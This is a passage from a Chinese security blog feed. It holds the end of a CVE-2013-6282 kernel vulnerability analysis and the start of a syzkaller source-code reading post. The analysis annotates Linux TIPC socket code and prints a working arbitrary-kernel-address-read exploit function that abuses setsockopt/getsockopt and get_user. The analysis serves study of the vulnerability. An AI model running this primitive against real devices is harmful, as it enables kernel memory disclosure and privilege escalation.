class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/fs/sync.c</span></span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(fsync, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> do_fsync(fd, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fsync</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">int</span> datasync)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret = -EBADF;</span><br><span class="line"></span><br><span class="line">file = fget(fd);</span><br><span class="line"><span class="keyword">if</span> (file) &#123;</span><br><span class="line">ret = vfs_fsync(file, datasync);</span><br><span class="line">fput(file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_fsync</span><span class="params">(struct file *file, <span class="keyword">int</span> datasync)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> vfs_fsync_range(file, <span class="number">0</span>, LLONG_MAX, datasync);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_fsync_range</span><span class="params">(struct file *file, <span class="keyword">loff_t</span> start, <span class="keyword">loff_t</span> end, <span class="keyword">int</span> datasync)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span> = <span class="title">file</span>-&gt;<span class="title">f_mapping</span>;</span></span><br><span class="line"><span class="keyword">int</span> err, ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file-&gt;f_op || !file-&gt;f_op-&gt;fsync) &#123;</span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = filemap_write_and_wait_range(mapping, start, end);</span><br><span class="line">mutex_lock(&amp;mapping-&gt;host-&gt;i_mutex);</span><br><span class="line"><span class="comment">//触发file_operation的fsync指针 实现haijack</span></span><br><span class="line">err = file-&gt;f_op-&gt;fsync(file, datasync);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = err;</span><br><span class="line">mutex_unlock(&amp;mapping-&gt;host-&gt;i_mutex);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="通过get-user实现任意地址读"><a href="#通过get-user实现任意地址读" class="headerlink" title="通过get_user实现任意地址读"></a><a href="https://elixir.bootlin.com/linux/v2.6.35/source/net/tipc/socket.c#L1662" target="_blank" rel="noopener">通过get_user实现任意地址读</a></h4><p>通过get_user达到任意地址读——建立socket,使用setsockopt实现任意地址读<br>(这里是阅读的linux内核非android具体判断是不一样的——从exp中可以看出)<br>1、建立一个socket<br>2、调用setsockopt实现任意地址读——把任意地址的内容读取到value<br>需要布置好lvl、ol参数的值绕过前面的判断,然后进入到res = get_user(value, (u32 __user *)ov),<br>实现任意地址读——ov是可控地址<br>3、调用getsockopt把value的值拷贝到用户空间</p><p>setsockopt实现任意地址读到value</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/net/tipc/socket.c#L1662</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">setsockopt</span><span class="params">(struct socket *sock,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">int</span> lvl, <span class="keyword">int</span> opt, <span class="keyword">char</span> __user *ov, <span class="keyword">unsigned</span> <span class="keyword">int</span> ol)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tipc_port</span> *<span class="title">tport</span> = <span class="title">tipc_sk_port</span>(<span class="title">sk</span>);</span></span><br><span class="line">u32 value;</span><br><span class="line"><span class="keyword">int</span> res;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((lvl == IPPROTO_TCP) &amp;&amp; (sock-&gt;type == SOCK_STREAM))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (lvl != SOL_TIPC)</span><br><span class="line"><span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"><span class="keyword">if</span> (ol &lt; <span class="keyword">sizeof</span>(value))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="comment">//ov是传入的地址可控</span></span><br><span class="line"><span class="comment">//通过get_user实现任意地址读到value</span></span><br><span class="line"><span class="keyword">if</span> ((res = get_user(value, (u32 __user *)ov)))</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">release_sock(sk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getsockopt把value的值拷贝到用户空间——通过copy_to_user函数实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/net/tipc/socket.c#L1721</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getsockopt</span><span class="params">(struct socket *sock,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">int</span> lvl, <span class="keyword">int</span> opt, <span class="keyword">char</span> __user *ov, <span class="keyword">int</span> __user *ol)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tipc_port</span> *<span class="title">tport</span> = <span class="title">tipc_sk_port</span>(<span class="title">sk</span>);</span></span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line">u32 value;</span><br><span class="line"><span class="keyword">int</span> res;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((lvl == IPPROTO_TCP) &amp;&amp; (sock-&gt;type == SOCK_STREAM))</span><br><span class="line"><span class="keyword">return</span> put_user(<span class="number">0</span>, ol);</span><br><span class="line"><span class="keyword">if</span> (lvl != SOL_TIPC)</span><br><span class="line"><span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"><span class="keyword">if</span> ((res = get_user(len, ol)))</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">lock_sock(sk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (opt) &#123;</span><br><span class="line"><span class="keyword">case</span> TIPC_IMPORTANCE:</span><br><span class="line">res = tipc_portimportance(tport-&gt;ref, &amp;value);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TIPC_SRC_DROPPABLE:</span><br><span class="line">res = tipc_portunreliable(tport-&gt;ref, &amp;value);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TIPC_DEST_DROPPABLE:</span><br><span class="line">res = tipc_portunreturnable(tport-&gt;ref, &amp;value);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TIPC_CONN_TIMEOUT:</span><br><span class="line">value = jiffies_to_msecs(sk-&gt;sk_rcvtimeo);</span><br><span class="line"><span class="comment">/* no need to set "res", since already 0 at this point */</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> TIPC_NODE_RECVQ_DEPTH:</span><br><span class="line">value = (u32)atomic_read(&amp;tipc_queue_size);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> TIPC_SOCK_RECVQ_DEPTH:</span><br><span class="line">value = skb_queue_len(&amp;sk-&gt;sk_receive_queue);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">res = -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">release_sock(sk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (res) &#123;</span><br><span class="line"><span class="comment">/* "get" failed */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (len &lt; <span class="keyword">sizeof</span>(value)) &#123;</span><br><span class="line">res = -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拷贝到用户空间ov &lt;- value</span></span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (copy_to_user(ov, &amp;value, <span class="keyword">sizeof</span>(value))) &#123;</span><br><span class="line">res = -EFAULT;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">res = put_user(<span class="keyword">sizeof</span>(value), ol);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关宏参数定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/socket.h#L275</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOL_IP0</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/socket.h#L299</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOL_TIPC271</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/in.h#L30</span></span><br><span class="line">IPPROTO_TCP = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/in.h#L30</span></span><br><span class="line">#define IP_TTL<span class="number">2</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L202</span></span><br><span class="line">#define TIPC_IMPORTANCE<span class="number">127</span><span class="comment">/* Default: TIPC_LOW_IMPORTANCE */</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L203</span></span><br><span class="line">#define TIPC_SRC_DROPPABLE<span class="number">128</span><span class="comment">/* Default: based on socket type */</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L204</span></span><br><span class="line">#define TIPC_DEST_DROPPABLE<span class="number">129</span><span class="comment">/* Default: based on socket type */</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L205</span></span><br><span class="line">#define TIPC_CONN_TIMEOUT<span class="number">130</span><span class="comment">/* Default: 8000 (ms)  */</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L206</span></span><br><span class="line">#define TIPC_NODE_RECVQ_DEPTH<span class="number">131</span><span class="comment">/* Default: none (read only) */</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L207</span></span><br><span class="line">#define TIPC_SOCK_RECVQ_DEPTH<span class="number">132</span><span class="comment">/* Default: none (read only) */</span></span><br></pre></td></tr></table></figure><h4 id="任意地址读exp"><a href="#任意地址读exp" class="headerlink" title="任意地址读exp"></a><a href="https://github.com/fi01/libget_user_exploit/blob/master/get_user.c" target="_blank" rel="noopener">任意地址读exp</a></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">static <span class="keyword">bool</span> ipsock_read_value_at_address(unsigned long address, <span class="keyword">int</span> *value)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="keyword">int</span> addr;</span><br><span class="line">  unsigned char *data = (void *)value;</span><br><span class="line">  <span class="keyword">int</span> sock;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  *value = <span class="number">0</span>;</span><br><span class="line">  errno = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//建立套接字</span></span><br><span class="line">  <span class="keyword">if</span> ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    printf(<span class="string">"error in socket().\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sizeof (*value); i++, address++, data++) &#123;</span><br><span class="line">  <span class="comment">//布置合理的lv绕过check,通过get_user读取address地址的内容实现任意地址读</span></span><br><span class="line">  <span class="comment">//返回0读取成功</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sock, SOL_IP, IP_TTL, (void *)address, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//get_user返回-EFAULT 失败</span></span><br><span class="line">    <span class="keyword">if</span> (errno != EINVAL) &#123;</span><br><span class="line">          printf(<span class="string">"error in setsockopt().\n"</span>);</span><br><span class="line">    *value = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//get_user返回0 说明get_user成功执行</span></span><br><span class="line">      socklen_t optlen = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (getsockopt(sock, SOL_IP, IP_TTL, data, &amp;optlen) != <span class="number">0</span>) &#123;</span><br><span class="line">      printf(<span class="string">"error in getsockopt().\n"</span>);</span><br><span class="line">*value = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">close</span>(sock);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://github.com/timwr/CVE-2013-6282/blob/master/exploit.c" target="_blank" rel="noopener">https://github.com/timwr/CVE-2013-6282/blob/master/exploit.c</a><br><a href="https://github.com/fi01/libput_user_exploit/blob/master/put_user.c" target="_blank" rel="noopener">https://github.com/fi01/libput_user_exploit/blob/master/put_user.c</a><br><a href="https://github.com/fi01/libget_user_exploit/blob/master/get_user.c" target="_blank" rel="noopener">https://github.com/fi01/libget_user_exploit/blob/master/get_user.c</a><br><a href="https://github.com/fi01/libget_user_exploit/blob/master/get_user.c" target="_blank" rel="noopener">https://github.com/fi01/libget_user_exploit/blob/master/get_user.c</a><br><a href="https://github.com/erik96/Linux-Kernel-3.4/blob/linux-stable2/net/tipc/socket.c" target="_blank" rel="noopener">https://github.com/erik96/Linux-Kernel-3.4/blob/linux-stable2/net/tipc/socket.c</a><br><a href="https://github.com/erik96/Linux-Kernel-3.4/" target="_blank" rel="noopener">https://github.com/erik96/Linux-Kernel-3.4/</a></p></the>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;本文摘要——&quot;&gt;&lt;a href=&quot;#本文摘要——&quot; class=&quot;headerlink&quot; title=&quot; 本文摘要——   &quot;&gt;&lt;/a&gt;&lt;strong&gt; 本文摘要—— CVE-2013-6282-analysis &lt;/strong&gt; &lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页:摘要=&quot;&quot;&gt;&lt;/excerpt&gt;&lt;/h1&gt;
    
    </summary>
    
      <category term="kernel" scheme="https://0x9k.club/categories/kernel/"/>
    
    
      <category term="linux" scheme="https://0x9k.club/tags/linux/"/>
    
      <category term="kernel" scheme="https://0x9k.club/tags/kernel/"/>
    
      <category term="cve-2013-6282" scheme="https://0x9k.club/tags/cve-2013-6282/"/>
    
  </entry>
  
  <entry>
    <title>syzkaller_source_read_target_type_and_function</title>
    <link href="https://0x9k.club/posts/uncategorized/2018-05-02-syzkaller_source_read_target_type_and_function.html"/>
    <id>https://0x9k.club/posts/uncategorized/2018-05-02-syzkaller_source_read_target_type_and_function.html</id>
    <published>2018-05-02T15:38:20.000Z</published>
    <updated>2018-05-02T15:38:20.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="本文摘要——"><a href="#本文摘要——" class="headerlink" title=" 本文摘要——   "></a><strong> 本文摘要—— syzkaller_source_read_target_type_and_function </strong> <excerpt in="" index="" |="" 首页:摘要=""></excerpt></h1><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="syzkaller源码阅读之Target类型以及相关的函数"><a href="#syzkaller源码阅读之Target类型以及相关的函数" class="headerlink" title="syzkaller源码阅读之Target类型以及相关的函数"></a>syzkaller源码阅读之Target类型以及相关的函数</h2><h3 id="Target类型"><a href="#Target类型" class="headerlink" title="Target类型"></a>Target类型</h3><p>Target类型是用来描述fuzz目标系统的相关信息,包含系统调用切片<br>prog/target.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Target <span class="keyword">struct</span> &#123;</span><br><span class="line">OS         <span class="keyword">string</span>                               <span class="comment">//操作系统名字</span></span><br><span class="line">Arch       <span class="keyword">string</span>                               <span class="comment">//体系结构名</span></span><br><span class="line">Revision   <span class="keyword">string</span>                               <span class="comment">//对描述做hash 唯一化</span></span><br><span class="line">PtrSize    <span class="keyword">uint64</span>                               <span class="comment">//目标系统指针大小</span></span><br><span class="line">PageSize   <span class="keyword">uint64</span>                               <span class="comment">//目标系统页大小</span></span><br><span class="line">NumPages   <span class="keyword">uint64</span>                               <span class="comment">//目标中页数目</span></span><br><span class="line">DataOffset <span class="keyword">uint64</span>                               <span class="comment">//DataOffset</span></span><br><span class="line"></span><br><span class="line">Syscalls  []*Syscall                            <span class="comment">//目标的系统调用描述切片数组 Syscall类型</span></span><br><span class="line">Resources []*ResourceDesc</span><br><span class="line">Structs   []*KeyedStruct</span><br><span class="line">Consts    []ConstValue</span><br><span class="line"></span><br><span class="line"><span class="comment">// MakeMmap用来创建一段内存范围  [addr, addr+size)</span></span><br><span class="line">MakeMmap <span class="function"><span class="keyword">func</span><span class="params">(addr, size <span class="keyword">uint64</span>)</span> *<span class="title">Call</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SanitizeCall</span> <span class="title">func</span><span class="params">(c *Call)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// <span class="title">SpecialTypes</span>是用来进行变异的 键是要编译的结构体/联合 值是变异的函数</span></span><br><span class="line"><span class="function"><span class="title">SpecialTypes</span> <span class="title">map</span>[<span class="title">string</span>]<span class="title">func</span><span class="params">(g *Gen, typ Type, old Arg)</span> <span class="params">(Arg, []*Call)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// 对目标有特殊影响的字符串</span></span><br><span class="line"><span class="function"><span class="title">StringDictionary</span> []<span class="title">string</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">init</span>        <span class="title">sync</span>.<span class="title">Once</span>//<span class="title">init</span> <span class="title">sync</span>.<span class="title">Once</span>保证唯一性、只运行一次</span></span><br><span class="line"><span class="function"><span class="title">initArch</span>    <span class="title">func</span><span class="params">(target *Target)</span>//初始化体系结构</span></span><br><span class="line"><span class="function"><span class="title">SyscallMap</span>  <span class="title">map</span>[<span class="title">string</span>]*<span class="title">Syscall</span></span></span><br><span class="line"><span class="function"><span class="title">ConstMap</span>    <span class="title">map</span>[<span class="title">string</span>]<span class="title">uint64</span></span></span><br><span class="line"><span class="function"><span class="title">resourceMap</span> <span class="title">map</span>[<span class="title">string</span>]*<span class="title">ResourceDesc</span></span></span><br><span class="line"><span class="function"><span class="title">resourceCtors</span> <span class="title">map</span>[<span class="title">string</span>][]*<span class="title">Syscall</span></span></span><br><span class="line"><span class="function"><span class="title">any</span>           <span class="title">anyTypes</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Target类型几个重要的参数"><a href="#Target类型几个重要的参数" class="headerlink" title="Target类型几个重要的参数"></a>Target类型几个重要的参数</h4><h5 id="注册一个新的Target类型"><a href="#注册一个新的Target类型" class="headerlink" title="注册一个新的Target类型"></a>注册一个新的Target类型</h5><p>当manager启动时候保存有一个targets的全局变量(map类型,键是:”OS/Arch”——特定的操作系统和体系结构,如OS:”linux”, Arch: “amd64”,值是:对应的Target类型)<br>注册一个新的Target类型<br>prog/target.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> targets = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*Target)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RegisterTarget</span><span class="params">(target *Target, initArch <span class="keyword">func</span>(target *Target)</span>)</span> &#123;</span><br><span class="line"><span class="comment">//键</span></span><br><span class="line">key := target.OS + <span class="string">"/"</span> + target.Arch</span><br><span class="line"><span class="keyword">if</span> targets[key] != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(fmt.Sprintf(<span class="string">"duplicate target %v"</span>, key))</span><br><span class="line">&#125;</span><br><span class="line">target.initArch = initArch</span><br><span class="line"><span class="comment">//注册到全局变量中</span></span><br><span class="line">targets[key] = target</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在syzkaller/sys/目录下包含了所支持的所有Target类型,比如linux系统下的amd64体系结构,在syzkaller/sys/linux/amd64.go中定义了Target类型所需要的各种参数如系统调用、分页大小、指针大小等信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">        RegisterTarget(&amp;Target&#123;OS: <span class="string">"linux"</span>, Arch: <span class="string">"amd64"</span>, Revision: revision_amd64, PtrSize: <span class="number">8</span>, PageSize: <span class="number">4096</span>, NumPages: <span class="number">4096</span>, DataOffset: <span class="number">536870912</span>, Syscalls: syscalls_amd64, Resources: resources_amd64, Structs: structDescs_amd64, Consts: consts_amd64&#125;, initTarget)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="从全局变量targets中获取一个具体的Target"><a href="#从全局变量targets中获取一个具体的Target" class="headerlink" title="从全局变量targets中获取一个具体的Target"></a>从全局变量targets中获取一个具体的Target</h5><p>通过OS、arch得到key,然后返回对应具体的Target类型<br>prog/target.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetTarget</span><span class="params">(OS, arch <span class="keyword">string</span>)</span> <span class="params">(*Target, error)</span></span> &#123;</span><br><span class="line"><span class="comment">//通过os、arch拼接得到键</span></span><br><span 